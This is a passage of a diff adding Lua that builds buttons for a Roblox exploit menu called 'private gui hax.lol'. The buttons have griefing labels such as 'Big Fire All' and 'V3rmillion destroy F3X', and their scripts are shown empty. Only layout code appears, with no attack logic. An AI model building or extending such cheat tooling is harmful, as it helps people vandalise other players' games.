+G2L["99"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["99"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["99"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["99"]["Text"] = [[i0rb]];
+G2L["99"]["Name"] = [[Button]];
+G2L["99"]["Position"] = UDim2.new(-2.66782, 0, 5.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["9a"] = Instance.new("LocalScript", G2L["99"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["9b"] = Instance.new("TextButton", G2L["7a"]);
+G2L["9b"]["TextWrapped"] = true;
+G2L["9b"]["BorderSizePixel"] = 3;
+G2L["9b"]["TextSize"] = 14;
+G2L["9b"]["TextScaled"] = true;
+G2L["9b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9b"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["9b"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["9b"]["Text"] = [[Big Fire All]];
+G2L["9b"]["Name"] = [[Button]];
+G2L["9b"]["Position"] = UDim2.new(-1.35203, 0, 5.51884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["9c"] = Instance.new("LocalScript", G2L["9b"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["9d"] = Instance.new("TextButton", G2L["7a"]);
+G2L["9d"]["TextWrapped"] = true;
+G2L["9d"]["BorderSizePixel"] = 3;
+G2L["9d"]["TextSize"] = 14;
+G2L["9d"]["TextScaled"] = true;
+G2L["9d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9d"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9d"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["9d"]["BorderColor3"] = Color3.fromRGB(9, 0, 255);
+G2L["9d"]["Text"] = [[Oliver Tree]];
+G2L["9d"]["Name"] = [[Button]];
+G2L["9d"]["Position"] = UDim2.new(-1.35203, 0, 32.98759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["9e"] = Instance.new("LocalScript", G2L["9d"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["9f"] = Instance.new("TextButton", G2L["7a"]);
+G2L["9f"]["TextWrapped"] = true;
+G2L["9f"]["BorderSizePixel"] = 3;
+G2L["9f"]["TextSize"] = 14;
+G2L["9f"]["TextScaled"] = true;
+G2L["9f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["9f"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["9f"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["9f"]["Text"] = [[UnMesh All Parts]];
+G2L["9f"]["Name"] = [[Button]];
+G2L["9f"]["Position"] = UDim2.new(-5.30993, 0, 6.89384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["a1"] = Instance.new("TextButton", G2L["7a"]);
+G2L["a1"]["TextWrapped"] = true;
+G2L["a1"]["BorderSizePixel"] = 3;
+G2L["a1"]["TextSize"] = 14;
+G2L["a1"]["TextScaled"] = true;
+G2L["a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["a1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["a1"]["Text"] = [[i0rb 2]];
+G2L["a1"]["Name"] = [[Button]];
+G2L["a1"]["Position"] = UDim2.new(-4.02571, 0, 6.89384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["a2"] = Instance.new("LocalScript", G2L["a1"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["a3"] = Instance.new("TextButton", G2L["7a"]);
+G2L["a3"]["TextWrapped"] = true;
+G2L["a3"]["BorderSizePixel"] = 3;
+G2L["a3"]["TextSize"] = 14;
+G2L["a3"]["TextScaled"] = true;
+G2L["a3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["a3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["a3"]["Text"] = [[V3rmillion destroy F3X]];
+G2L["a3"]["Name"] = [[Button]];
+G2L["a3"]["Position"] = UDim2.new(-2.66782, 0, 6.89384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["a4"] = Instance.new("LocalScript", G2L["a3"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["a5"] = Instance.new("TextButton", G2L["7a"]);
+G2L["a5"]["TextWrapped"] = true;
+G2L["a5"]["BorderSizePixel"] = 3;
+G2L["a5"]["TextSize"] = 14;
+G2L["a5"]["TextScaled"] = true;
+G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["a5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["a5"]["Text"] = [[funni Chomik Skybox]];
+G2L["a5"]["Name"] = [[Button]];
+G2L["a5"]["Position"] = UDim2.new(-1.35203, 0, 6.89384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["a6"] = Instance.new("LocalScript", G2L["a5"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["a7"] = Instance.new("TextButton", G2L["7a"]);
+G2L["a7"]["TextWrapped"] = true;
+G2L["a7"]["BorderSizePixel"] = 3;
+G2L["a7"]["TextSize"] = 14;
+G2L["a7"]["TextScaled"] = true;
+G2L["a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["a7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["a7"]["Text"] = [[funni Chomik Decal]];
+G2L["a7"]["Name"] = [[Button]];
+G2L["a7"]["Position"] = UDim2.new(-0.00466, 0, 6.89384, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button.LocalScript
+G2L["a8"] = Instance.new("LocalScript", G2L["a7"]);
+
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["a9"] = Instance.new("TextButton", G2L["7a"]);
+G2L["a9"]["TextWrapped"] = true;
+G2L["a9"]["BorderSizePixel"] = 3;
+G2L["a9"]["TextSize"] = 14;
+G2L["a9"]["TextScaled"] = true;
+G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["a9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["a9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["a9"]["Text"] = [[Empty]];
+G2L["a9"]["Name"] = [[Button]];
+G2L["a9"]["Position"] = UDim2.new(-5.30993, 0, 8.26884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["aa"] = Instance.new("TextButton", G2L["7a"]);
+G2L["aa"]["TextWrapped"] = true;
+G2L["aa"]["BorderSizePixel"] = 3;
+G2L["aa"]["TextSize"] = 14;
+G2L["aa"]["TextScaled"] = true;
+G2L["aa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["aa"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["aa"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["aa"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["aa"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["aa"]["Text"] = [[Empty]];
+G2L["aa"]["Name"] = [[Button]];
+G2L["aa"]["Position"] = UDim2.new(-4.02571, 0, 8.26884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ab"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ab"]["TextWrapped"] = true;
+G2L["ab"]["BorderSizePixel"] = 3;
+G2L["ab"]["TextSize"] = 14;
+G2L["ab"]["TextScaled"] = true;
+G2L["ab"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ab"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ab"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ab"]["Text"] = [[Empty]];
+G2L["ab"]["Name"] = [[Button]];
+G2L["ab"]["Position"] = UDim2.new(-2.66782, 0, 8.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ac"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ac"]["TextWrapped"] = true;
+G2L["ac"]["BorderSizePixel"] = 3;
+G2L["ac"]["TextSize"] = 14;
+G2L["ac"]["TextScaled"] = true;
+G2L["ac"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ac"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ac"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ac"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ac"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ac"]["Text"] = [[Empty]];
+G2L["ac"]["Name"] = [[Button]];
+G2L["ac"]["Position"] = UDim2.new(-1.35203, 0, 8.26884, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ad"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ad"]["TextWrapped"] = true;
+G2L["ad"]["BorderSizePixel"] = 3;
+G2L["ad"]["TextSize"] = 14;
+G2L["ad"]["TextScaled"] = true;
+G2L["ad"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ad"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ad"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ad"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ad"]["Text"] = [[Empty]];
+G2L["ad"]["Name"] = [[Button]];
+G2L["ad"]["Position"] = UDim2.new(-0.00466, 0, 8.23759, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ae"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ae"]["TextWrapped"] = true;
+G2L["ae"]["BorderSizePixel"] = 3;
+G2L["ae"]["TextSize"] = 14;
+G2L["ae"]["TextScaled"] = true;
+G2L["ae"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ae"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ae"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ae"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ae"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ae"]["Text"] = [[Empty]];
+G2L["ae"]["Name"] = [[Button]];
+G2L["ae"]["Position"] = UDim2.new(-5.30993, 0, 9.67509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["af"] = Instance.new("TextButton", G2L["7a"]);
+G2L["af"]["TextWrapped"] = true;
+G2L["af"]["BorderSizePixel"] = 3;
+G2L["af"]["TextSize"] = 14;
+G2L["af"]["TextScaled"] = true;
+G2L["af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["af"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["af"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["af"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["af"]["Text"] = [[Empty]];
+G2L["af"]["Name"] = [[Button]];
+G2L["af"]["Position"] = UDim2.new(-4.02571, 0, 9.67509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b0"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b0"]["TextWrapped"] = true;
+G2L["b0"]["BorderSizePixel"] = 3;
+G2L["b0"]["TextSize"] = 14;
+G2L["b0"]["TextScaled"] = true;
+G2L["b0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b0"]["Text"] = [[Empty]];
+G2L["b0"]["Name"] = [[Button]];
+G2L["b0"]["Position"] = UDim2.new(-2.66782, 0, 9.67509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b1"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b1"]["TextWrapped"] = true;
+G2L["b1"]["BorderSizePixel"] = 3;
+G2L["b1"]["TextSize"] = 14;
+G2L["b1"]["TextScaled"] = true;
+G2L["b1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b1"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b1"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b1"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b1"]["Text"] = [[Empty]];
+G2L["b1"]["Name"] = [[Button]];
+G2L["b1"]["Position"] = UDim2.new(-1.35203, 0, 9.67509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b2"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b2"]["TextWrapped"] = true;
+G2L["b2"]["BorderSizePixel"] = 3;
+G2L["b2"]["TextSize"] = 14;
+G2L["b2"]["TextScaled"] = true;
+G2L["b2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b2"]["Text"] = [[Empty]];
+G2L["b2"]["Name"] = [[Button]];
+G2L["b2"]["Position"] = UDim2.new(-0.00466, 0, 9.67509, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b3"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b3"]["TextWrapped"] = true;
+G2L["b3"]["BorderSizePixel"] = 3;
+G2L["b3"]["TextSize"] = 14;
+G2L["b3"]["TextScaled"] = true;
+G2L["b3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b3"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b3"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b3"]["Text"] = [[Empty]];
+G2L["b3"]["Name"] = [[Button]];
+G2L["b3"]["Position"] = UDim2.new(-5.30993, 0, 11.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b4"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b4"]["TextWrapped"] = true;
+G2L["b4"]["BorderSizePixel"] = 3;
+G2L["b4"]["TextSize"] = 14;
+G2L["b4"]["TextScaled"] = true;
+G2L["b4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b4"]["Text"] = [[Empty]];
+G2L["b4"]["Name"] = [[Button]];
+G2L["b4"]["Position"] = UDim2.new(-4.02571, 0, 11.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b5"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b5"]["TextWrapped"] = true;
+G2L["b5"]["BorderSizePixel"] = 3;
+G2L["b5"]["TextSize"] = 14;
+G2L["b5"]["TextScaled"] = true;
+G2L["b5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b5"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b5"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b5"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b5"]["Text"] = [[Empty]];
+G2L["b5"]["Name"] = [[Button]];
+G2L["b5"]["Position"] = UDim2.new(-2.66782, 0, 11.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b6"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b6"]["TextWrapped"] = true;
+G2L["b6"]["BorderSizePixel"] = 3;
+G2L["b6"]["TextSize"] = 14;
+G2L["b6"]["TextScaled"] = true;
+G2L["b6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b6"]["Text"] = [[Empty]];
+G2L["b6"]["Name"] = [[Button]];
+G2L["b6"]["Position"] = UDim2.new(-1.35203, 0, 11.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b7"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b7"]["TextWrapped"] = true;
+G2L["b7"]["BorderSizePixel"] = 3;
+G2L["b7"]["TextSize"] = 14;
+G2L["b7"]["TextScaled"] = true;
+G2L["b7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b7"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b7"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b7"]["Text"] = [[Empty]];
+G2L["b7"]["Name"] = [[Button]];
+G2L["b7"]["Position"] = UDim2.new(-0.00466, 0, 11.11259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b8"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b8"]["TextWrapped"] = true;
+G2L["b8"]["BorderSizePixel"] = 3;
+G2L["b8"]["TextSize"] = 14;
+G2L["b8"]["TextScaled"] = true;
+G2L["b8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b8"]["Text"] = [[Empty]];
+G2L["b8"]["Name"] = [[Button]];
+G2L["b8"]["Position"] = UDim2.new(-5.30993, 0, 12.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["b9"] = Instance.new("TextButton", G2L["7a"]);
+G2L["b9"]["TextWrapped"] = true;
+G2L["b9"]["BorderSizePixel"] = 3;
+G2L["b9"]["TextSize"] = 14;
+G2L["b9"]["TextScaled"] = true;
+G2L["b9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["b9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["b9"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["b9"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["b9"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["b9"]["Text"] = [[Empty]];
+G2L["b9"]["Name"] = [[Button]];
+G2L["b9"]["Position"] = UDim2.new(-4.02571, 0, 12.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["ba"] = Instance.new("TextButton", G2L["7a"]);
+G2L["ba"]["TextWrapped"] = true;
+G2L["ba"]["BorderSizePixel"] = 3;
+G2L["ba"]["TextSize"] = 14;
+G2L["ba"]["TextScaled"] = true;
+G2L["ba"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["ba"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["ba"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["ba"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["ba"]["Text"] = [[Empty]];
+G2L["ba"]["Name"] = [[Button]];
+G2L["ba"]["Position"] = UDim2.new(-2.66782, 0, 12.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["bb"] = Instance.new("TextButton", G2L["7a"]);
+G2L["bb"]["TextWrapped"] = true;
+G2L["bb"]["BorderSizePixel"] = 3;
+G2L["bb"]["TextSize"] = 14;
+G2L["bb"]["TextScaled"] = true;
+G2L["bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bb"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["bb"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["bb"]["Text"] = [[Empty]];
+G2L["bb"]["Name"] = [[Button]];
+G2L["bb"]["Position"] = UDim2.new(-1.35203, 0, 12.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["bc"] = Instance.new("TextButton", G2L["7a"]);
+G2L["bc"]["TextWrapped"] = true;
+G2L["bc"]["BorderSizePixel"] = 3;
+G2L["bc"]["TextSize"] = 14;
+G2L["bc"]["TextScaled"] = true;
+G2L["bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bc"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["bc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["bc"]["Text"] = [[Empty]];
+G2L["bc"]["Name"] = [[Button]];
+G2L["bc"]["Position"] = UDim2.new(-0.00466, 0, 12.61259, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["bd"] = Instance.new("TextButton", G2L["7a"]);
+G2L["bd"]["TextWrapped"] = true;
+G2L["bd"]["BorderSizePixel"] = 3;
+G2L["bd"]["TextSize"] = 14;
+G2L["bd"]["TextScaled"] = true;
+G2L["bd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bd"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bd"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bd"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["bd"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["bd"]["Text"] = [[Empty]];
+G2L["bd"]["Name"] = [[Button]];
+G2L["bd"]["Position"] = UDim2.new(-5.30993, 0, 14.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["be"] = Instance.new("TextButton", G2L["7a"]);
+G2L["be"]["TextWrapped"] = true;
+G2L["be"]["BorderSizePixel"] = 3;
+G2L["be"]["TextSize"] = 14;
+G2L["be"]["TextScaled"] = true;
+G2L["be"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["be"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["be"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["be"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["be"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["be"]["Text"] = [[Empty]];
+G2L["be"]["Name"] = [[Button]];
+G2L["be"]["Position"] = UDim2.new(-4.02571, 0, 14.08134, 0);
+
+
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.Button
+G2L["bf"] = Instance.new("TextButton", G2L["7a"]);
+G2L["bf"]["TextWrapped"] = true;
+G2L["bf"]["BorderSizePixel"] = 3;
+G2L["bf"]["TextSize"] = 14;
+G2L["bf"]["TextScaled"] = true;
+G2L["bf"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
